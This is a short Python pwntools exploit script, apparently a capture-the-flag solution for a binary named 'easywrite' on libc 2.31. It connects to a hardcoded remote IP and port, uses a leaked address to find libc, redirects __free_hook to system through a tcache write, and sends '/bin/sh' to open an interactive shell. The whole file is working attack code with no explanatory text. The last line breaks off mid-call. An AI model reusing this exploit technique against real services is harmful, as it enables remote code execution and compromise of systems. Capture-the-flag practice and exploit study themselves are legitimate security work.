from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
libc = ELF("./libc-2.31.so")
#p = process("./easywrite")#,env={"LD_PRELOAD":"./libc-2.31.so"})
p = remote("124.156.183.246", 20000)


#gdb.attach(p)
p.recvuntil("Here is your gift:0x")
libc.address = int(p.recv(12), 16)-0x7ffff7e64c50+0x7ffff7dd6000
print hex(libc.address)
payload = p64(libc.sym['__free_hook']-8)*30
p.sendafter("Input your message:",payload)
#gdb.attach(p)
#debug(0x132d)
#gdb.attach(p,'b*0x7ffff7e710bf\nb _IO_flush_all_lockp\nb*0x7ffff7e6bcaf')
#gdb.attach(p,'b free')
p.sendafter("Where to write?:",p64(libc.address+0x1f34f0))#tcache
p.sendlineafter("Any last message?:",'/bin/sh\x00'+p64(libc.sym['system']))
p.interactive(